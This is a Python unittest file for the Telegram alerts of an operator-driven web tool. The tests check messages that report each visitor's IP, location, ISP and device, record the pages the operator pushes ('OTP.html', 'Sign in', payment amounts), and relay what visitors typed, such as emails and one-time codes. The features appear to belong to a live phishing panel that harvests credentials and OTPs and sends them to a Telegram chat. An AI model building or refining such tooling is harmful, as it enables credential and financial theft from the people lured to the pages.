#!/usr/bin/env python3
"""What a Telegram alert says, and who decides it.

Four complaints, one rule: the operator decides what each message contains.

  * CLIENT CONNECTED was one lump — identity, location and device always
    arrived together. It is now three independent groups, so an operator who
    only cares about the device can turn the other two off (or turn all three
    off and get the bare headline).
  * WORKFLOW STARTED / FINISHED always carried workflow + steps + a client id.
    Both can now be the headline alone.
  * Every message identified the visitor by the last ten characters of a
    random id (``_yehwgj9l9``), which says nothing on a phone. They carry the
    clock time instead.
  * A page pushed with values typed for that one visitor ("amount = NGN
    50,000") now reports those values, the page name and the time, instead of
    an anonymous field dump.
  * The same clock-time identity reaches the rest of the feed too: CLIENT
    DISCONNECTED, OPERATOR PAGE DISPATCH, FORM SUBMISSION DETECTED, PAGE
    NAVIGATION DETECTED and WORKFLOW EXECUTION ERROR. No notification prints
    a client-id fragment any more, and the operator's manual push reads as a
    proper titled message with its own icons.

A partial save must stay partial: the mini admin posts only its own switches
and must not reset the message-detail settings it never mentions.

    python3 tests/test_telegram_messages.py
"""

from __future__ import annotations

import inspect
import re
import sys
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

try:
    import api  # noqa: E402
except ModuleNotFoundError as exc:  # pragma: no cover - bare checkout
    print("telegram messages: skipped (%s not installed)" % exc.name)
    raise SystemExit(0)

ADMIN_HTML = ROOT / "Admin.html"
STAMP = re.compile(r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}")
CLIENT_ID = "f0b1c2d3e4-abcdef-_yehwgj9l9"


class TelegramCase(unittest.TestCase):
    """Each test starts from a clean, fully-on config."""

    def setUp(self):
        self._saved_config = dict(api.telegram_config or {})
        self._saved_loaded = api.telegram_config_loaded
        self._saved_push = dict(api._LPV_PUSH_BINDINGS)
        self._saved_fields = dict(api._lpv_final_fields)
        api.telegram_config = {"bot_token": "123:abc", "chat_id": "42", "enabled": True}
        api.telegram_config_loaded = True
        api._LPV_PUSH_BINDINGS.clear()
        api._lpv_final_fields.clear()

    def tearDown(self):
        api.telegram_config = self._saved_config
        api.telegram_config_loaded = self._saved_loaded
        api._LPV_PUSH_BINDINGS.clear()
        api._LPV_PUSH_BINDINGS.update(self._saved_push)
        api._lpv_final_fields.clear()
        api._lpv_final_fields.update(self._saved_fields)

    # ---- helpers -------------------------------------------------------
    def flags(self, **changes):
        cfg = dict(api.telegram_config)
        cfg.update(changes)
        api.telegram_config = cfg

    def connected(self, **changes):
        return api._tg_connected_message(
            CLIENT_ID,
            workflow_name="Checkout",
            workflow_via="link",
            pass_code="ab12cd34",
            ip="203.0.113.9",
            country="Nigeria",
            region="Rivers",
            city="Port Harcourt",
            isp="Example ISP",
            device_type="Mobile",
            screen_size="390×844",
            user_agent="Mozilla/5.0 (Linux; Android 14)",
            **changes,
        )


class ClientConnectedTest(TelegramCase):
    def test_everything_on_is_the_full_message(self):
        msg = self.connected()
        self.assertIn("CLIENT CONNECTED", msg)
        self.assertIn("Workflow", msg)
        self.assertIn("Checkout (link)", msg)
        self.assertIn("Pass code", msg)
        self.assertIn("Location &amp; network", msg)
        self.assertIn("Port Harcourt", msg)
        self.assertIn("Device", msg)
        self.assertIn("Mobile (390×844)", msg)
        self.assertTrue(STAMP.search(msg), "no clock time in the connect alert")

    def test_only_the_identity_group(self):
        self.flags(connect_show_location=False, connect_show_device=False)
        msg = self.connected()
        self.assertIn("Pass code", msg)
        self.assertNotIn("Location &amp; network", msg)
        self.assertNotIn("203.0.113.9", msg)
        self.assertNotIn("Device", msg)
        self.assertNotIn("390×844", msg)

    def test_only_the_location_group(self):
        self.flags(connect_show_identity=False, connect_show_device=False)
        msg = self.connected()
        self.assertIn("Location &amp; network", msg)
        self.assertIn("Port Harcourt", msg)
        self.assertNotIn("Pass code", msg)
        self.assertNotIn("Checkout", msg)
        self.assertNotIn("Device</b>", msg)

    def test_only_the_device_group(self):
        self.flags(connect_show_identity=False, connect_show_location=False)
        msg = self.connected()
        self.assertIn("Device</b>", msg)
        self.assertIn("Android 14", msg)
        self.assertNotIn("Pass code", msg)
        self.assertNotIn("Location &amp; network", msg)

    def test_every_group_off_is_the_headline_alone(self):
        self.flags(
            connect_show_identity=False,
            connect_show_location=False,
            connect_show_device=False,
        )
        self.assertEqual(self.connected(), "\U0001F7E2 <b>CLIENT CONNECTED</b>")

    def test_missing_settings_default_to_the_full_message(self):
        # A config written before these switches existed must read as "on".
        full = self.connected()
        api.telegram_config = {"bot_token": "t", "chat_id": "c", "enabled": True}
        self.assertEqual(self.connected(), full)
        self.assertIn("Location &amp; network", full)
        self.assertIn("Device</b>", full)

    def test_flags_accept_strings_from_a_hand_edited_file(self):
        self.flags(connect_show_location="no", connect_show_device="off")
        msg = self.connected()
        self.assertNotIn("Location &amp; network", msg)
        self.assertNotIn("Device</b>", msg)

    def test_no_client_id_fragment(self):
        self.assertNotIn("_yehwgj9l9", self.connected())
        self.assertNotIn(
            "[-10:]",
            inspect.getsource(api._tg_connected_message),
            "connect alert still prints a client-id fragment",
        )


class WorkflowMessageTest(TelegramCase):
    WORKFLOW = {"id": "wf-1", "name": "Onboarding", "steps": [{"kind": "page"}, {"kind": "wait"}]}

    def test_started_with_details(self):
        msg = api._tg_workflow_started_message(self.WORKFLOW)
        self.assertIn("WORKFLOW STARTED", msg)
        self.assertIn("Onboarding", msg)
        self.assertIn("Steps", msg)
        self.assertTrue(STAMP.search(msg))
        self.assertNotIn("_yehwgj9l9", msg)

    def test_started_can_be_the_headline_alone(self):
        self.flags(workflow_start_show_details=False)
        msg = api._tg_workflow_started_message(self.WORKFLOW)
        self.assertEqual(msg, "\U0001F680 <b>WORKFLOW STARTED</b>")
        self.assertNotIn("Onboarding", msg)
        self.assertNotIn("Steps", msg)

    def test_finished_with_details(self):
        msg = api._tg_workflow_finished_message(self.WORKFLOW, 2)
        self.assertIn("WORKFLOW FINISHED", msg)
        self.assertIn("Steps completed", msg)
        self.assertIn("Onboarding", msg)
        self.assertTrue(STAMP.search(msg))

    def test_finished_can_be_the_headline_alone(self):
        self.flags(workflow_finish_show_details=False)
        msg = api._tg_workflow_finished_message(self.WORKFLOW, 2)
        self.assertEqual(msg, "\U0001F3C1 <b>WORKFLOW FINISHED</b>")

    def test_the_two_switches_are_independent(self):
        self.flags(workflow_start_show_details=False)
        self.assertNotIn("Onboarding", api._tg_workflow_started_message(self.WORKFLOW))
        self.assertIn("Onboarding", api._tg_workflow_finished_message(self.WORKFLOW, 2))

    def test_no_client_id_fragment(self):
        for builder in (api._tg_workflow_started_message, api._tg_workflow_finished_message):
            self.assertNotIn("[-10:]", inspect.getsource(builder))


class DetailsCapturedTest(TelegramCase):
    PAGE = {"page_id": "p-1", "page_name": "Sign in", "fields": {"email": "a@b.co"}}

    def test_plain_details_use_the_clock_not_the_client_id(self):
        msg = api._tg_details_message(CLIENT_ID, self.PAGE, {"email": "a@b.co"}, "settled (blur)")
        self.assertIn("DETAILS CAPTURED", msg)
        self.assertIn("Sign in", msg)
        self.assertIn("Finished typing", msg)
        self.assertIn("What they entered", msg)
        self.assertIn("a@b.co", msg)
        self.assertTrue(STAMP.search(msg), "no clock time in the captured-details alert")
        self.assertNotIn("_yehwgj9l9", msg)

    def test_a_pushed_value_gets_its_own_message(self):
        api._remember_push_bindings(CLIENT_ID, "p-1", "Sign in", {"amount": "NGN 50,000"})
        msg = api._tg_details_message(CLIENT_ID, self.PAGE, {"email": "a@b.co"}, "settled (blur)")
        self.assertIn("Sign in", msg)
        self.assertTrue(STAMP.search(msg))
        self.assertIn("CUSTOMISED PAGE", msg, "the customised copy is not marked out")
        self.assertIn("Page values", msg)
        self.assertIn("amount</b> = <code>NGN 50,000</code>", msg)
        # The entered values are still reported alongside the pushed ones.
        self.assertIn("What they entered", msg)
        self.assertIn("a@b.co", msg)

    def test_the_binding_label_is_preferred_when_known(self):
        api._remember_push_bindings(CLIENT_ID, "p-1", "Sign in", {"amount": "NGN 50,000"})
        api._LPV_PUSH_BINDINGS[CLIENT_ID]["labels"] = {"amount": "Amount to pay"}
        msg = api._tg_details_message(CLIENT_ID, self.PAGE, {"email": "a@b.co"})
        self.assertIn("Amount to pay</b> = <code>NGN 50,000</code>", msg)

    def test_the_special_message_can_be_switched_off(self):
        self.flags(binding_details_enabled=False)
        api._remember_push_bindings(CLIENT_ID, "p-1", "Sign in", {"amount": "NGN 50,000"})
        msg = api._tg_details_message(CLIENT_ID, self.PAGE, {"email": "a@b.co"})
        self.assertNotIn("Page values", msg)
        self.assertNotIn("NGN 50,000", msg)
        self.assertIn("What they entered", msg)

    def test_a_value_for_another_page_never_leaks(self):
        api._remember_push_bindings(CLIENT_ID, "p-2", "Other page", {"amount": "NGN 50,000"})
        msg = api._tg_details_message(CLIENT_ID, self.PAGE, {"email": "a@b.co"})
        self.assertNotIn("NGN 50,000", msg)
        self.assertNotIn("Page values", msg)

    def test_pushing_an_uncustomised_page_clears_the_memory(self):
        api._remember_push_bindings(CLIENT_ID, "p-1", "Sign in", {"amount": "NGN 50,000"})
        api._remember_push_bindings(CLIENT_ID, "p-1", "Sign in", {})
        self.assertNotIn(CLIENT_ID, api._LPV_PUSH_BINDINGS)
        msg = api._tg_details_message(CLIENT_ID, self.PAGE, {"email": "a@b.co"})
        self.assertNotIn("NGN 50,000", msg)

    def test_blank_values_are_not_remembered(self):
        api._remember_push_bindings(CLIENT_ID, "p-1", "Sign in", {"amount": "   "})
        self.assertNotIn(CLIENT_ID, api._LPV_PUSH_BINDINGS)

    def test_the_flush_sends_one_labelled_message(self):
        sent = []
        original = api.tg_notify
        api.tg_notify = lambda message, flag="notify_connect", flag_default=True: sent.append((message, flag))
        try:
            api._remember_push_bindings(CLIENT_ID, "p-1", "Sign in", {"amount": "NGN 50,000"})
            api._lpv_final_fields[CLIENT_ID] = {
                "page_id": "p-1", "page_name": "Sign in",
                "fields": {"email": "a@b.co", "otp": "123456"},
            }
            api._lpv_final_flush(CLIENT_ID, "settled (blur)")
        finally:
            api.tg_notify = original
        self.assertEqual(len(sent), 1, sent)
        message, flag = sent[0]
        self.assertEqual(flag, "notify_lpv_final")
        self.assertIn("NGN 50,000", message)
        self.assertIn("a@b.co", message)
        self.assertIn("123456", message)
        self.assertNotIn(CLIENT_ID, api._lpv_final_fields, "the buffer was not cleared")


class DisconnectAndDispatchTest(TelegramCase):
    def test_disconnect_reports_duration_and_the_clock(self):
        msg = api._tg_disconnected_message(185)
        self.assertIn("CLIENT DISCONNECTED", msg)
        self.assertIn("Time on page", msg)
        self.assertIn("3m 5s", msg)
        self.assertIn("Left at", msg, "the clock row should say when they left")
        self.assertTrue(STAMP.search(msg), "no clock time in the disconnect alert")
        self.assertNotIn("_yehwgj9l9", msg)

    def test_disconnect_under_a_minute(self):
        self.assertIn("9s", api._tg_disconnected_message(9))
        self.assertNotIn("0m", api._tg_disconnected_message(9))

    def test_disconnect_survives_a_bad_duration(self):
        self.assertIn("CLIENT DISCONNECTED", api._tg_disconnected_message("oops"))

    def test_dispatch_is_titled_and_iconed(self):
        msg = api._tg_dispatch_message("OTP.html")
        self.assertIn("OPERATOR PAGE DISPATCH", msg)
        self.assertTrue(msg.startswith("\U0001F4E4 "), "dispatch lost its header icon")
        self.assertIn("\U0001F4C4 <b>Pushed page</b>", msg)
        self.assertIn("OTP.html", msg)
        self.assertIn("\U0001F551 <b>Time</b>", msg)
        self.assertTrue(STAMP.search(msg))
        self.assertNotIn("_yehwgj9l9", msg)

    def test_dispatch_lists_the_values_it_was_sent_with(self):
        msg = api._tg_dispatch_message("OTP.html", {"amount": "NGN 50,000"}, "p-1")
        self.assertIn("Page values", msg)
        self.assertIn("amount</b> = <code>NGN 50,000</code>", msg)

    def test_dispatch_without_values_has_no_value_block(self):
        self.assertNotIn("Page values", api._tg_dispatch_message("OTP.html"))
        self.assertNotIn("Page values", api._tg_dispatch_message("OTP.html", {"a": " "}))

    def test_form_submission_uses_the_clock(self):
        msg = api._tg_form_submission_message("Login", {"email": "a@b.co", "otp": ["1", "2"]})
        self.assertIn("FORM SUBMISSION DETECTED", msg)
        self.assertIn("Source page", msg)
        self.assertIn("a@b.co", msg)
        self.assertIn("1, 2", msg)
        self.assertTrue(STAMP.search(msg))
        self.assertNotIn("_yehwgj9l9", msg)

    def test_form_submission_without_fields_says_so(self):
        self.assertIn("No fields recorded", api._tg_form_submission_message("Login", {}))

    def test_navigation_uses_the_clock(self):
        msg = api._tg_navigation_message("Sign in", "p-1")
        self.assertIn("PAGE NAVIGATION DETECTED", msg)
        self.assertIn("Sign in", msg)
        self.assertTrue(STAMP.search(msg))
        self.assertNotIn("_yehwgj9l9", msg)

    def test_workflow_error_uses_the_clock(self):
        msg = api._tg_workflow_error_message({"name": "Onboarding"}, "boom")
        self.assertIn("WORKFLOW EXECUTION ERROR", msg)
        self.assertIn("Onboarding", msg)
        self.assertIn("boom", msg)
        self.assertTrue(STAMP.search(msg))
        self.assertNotIn("_yehwgj9l9", msg)

    def test_no_builder_prints_a_client_id_fragment(self):
        for builder in (
            api._tg_connected_message,
            api._tg_workflow_started_message,
            api._tg_workflow_finished_message,
            api._tg_details_message,
            api._tg_disconnected_message,
            api._tg_dispatch_message,
            api._tg_form_submission_message,
            api._tg_navigation_message,
            api._tg_workflow_error_message,
        ):
            self.assertNotIn("[-10:]", inspect.getsource(builder), builder.__name__)

    def test_no_notification_is_built_inline_in_a_handler(self):
        # Everything Telegram says now comes from a builder, which is what
        # keeps the wording consistent (and testable).
        src = (ROOT / "api.py").read_text(encoding="utf-8", errors="replace")
        self.assertNotIn("[-10:]", src)
        self.assertIn("_tg_dispatch_message(", src)
        self.assertIn("_tg_disconnected_message(", src)


class SettingsTest(TelegramCase):
    def test_every_detail_switch_is_a_known_setting(self):
        for key in (
            "connect_show_identity",
            "connect_show_location",
            "connect_show_device",
            "workflow_start_show_details",
            "workflow_finish_show_details",
            "binding_details_enabled",
        ):
            self.assertIn(key, api.TG_BOOL_DEFAULTS)
            self.assertTrue(api.TG_BOOL_DEFAULTS[key], key + " should default to on")

    def test_a_partial_save_keeps_the_switches_it_did_not_send(self):
        saved = api._merge_telegram_save(
            {"bot_token": "t", "chat_id": "c", "enabled": True},
            {"connect_show_device": False, "workflow_start_show_details": False,
             "binding_details_enabled": False},
        )
        self.assertFalse(saved["connect_show_device"])
        self.assertFalse(saved["workflow_start_show_details"])
        self.assertFalse(saved["binding_details_enabled"])
        self.assertTrue(saved["connect_show_identity"])

    def test_a_save_can_turn_a_switch_on_again(self):
        saved = api._merge_telegram_save(
            {"connect_show_device": True},
            {"connect_show_device": False},
        )
        self.assertTrue(saved["connect_show_device"])

    def test_a_save_understands_strings(self):
        saved = api._merge_telegram_save({"enabled": "off", "connect_show_location": "no"})
        self.assertFalse(saved["enabled"])
        self.assertFalse(saved["connect_show_location"])

    def test_the_saved_shape_is_normalised_on_load(self):
        cfg = api._normalize_telegram_config({"connect_show_device": "false"})
        self.assertIs(cfg["connect_show_device"], False)

    def test_the_save_endpoint_uses_the_merge(self):
        src = inspect.getsource(api.save_telegram_config)
        self.assertIn("_merge_telegram_save(body, telegram_config)", src)
        self.assertNotIn('body.get("notify_connect", True)', src)

    def test_the_get_endpoint_always_answers_the_detail_switches(self):
        src = inspect.getsource(api.get_telegram_config)
        self.assertIn("TG_BOOL_DEFAULTS", src)
        self.assertIn("effective.setdefault", src)


class AdminPanelTest(unittest.TestCase):
    def setUp(self):
        self.src = ADMIN_HTML.read_text(encoding="utf-8", errors="replace")

    def test_every_switch_has_a_control(self):
        for control in (
            "tg-connect-identity",
            "tg-connect-location",
            "tg-connect-device",
            "tg-workflow-start-details",
            "tg-workflow-finish-details",
            "tg-binding-details",
        ):
            self.assertIn('id="' + control + '"', self.src)

    def test_every_switch_is_saved_under_its_server_name(self):
        for field in (
            "connect_show_identity",
            "connect_show_location",
            "connect_show_device",
            "workflow_start_show_details",
            "workflow_finish_show_details",
            "binding_details_enabled",
        ):
            self.assertIn(field + ":", self.src, "Admin never posts " + field)

    def test_the_panel_reads_every_switch_back(self):
        for field in (
            "srv.connect_show_identity",
            "srv.connect_show_location",
            "srv.connect_show_device",
            "srv.workflow_start_show_details",
            "srv.workflow_finish_show_details",
            "srv.binding_details_enabled",
        ):
            self.assertIn(field, self.src, "Admin never reads " + field)

    def test_the_controls_save_live(self):
        section = self.src[self.src.index("Message Detail"):]
        section = section[:section.index("Connection Status")]
        self.assertEqual(section.count('onchange="tgToggleChanged()"'), 6)


if __name__ == "__main__":
    unittest.main(verbosity=1)
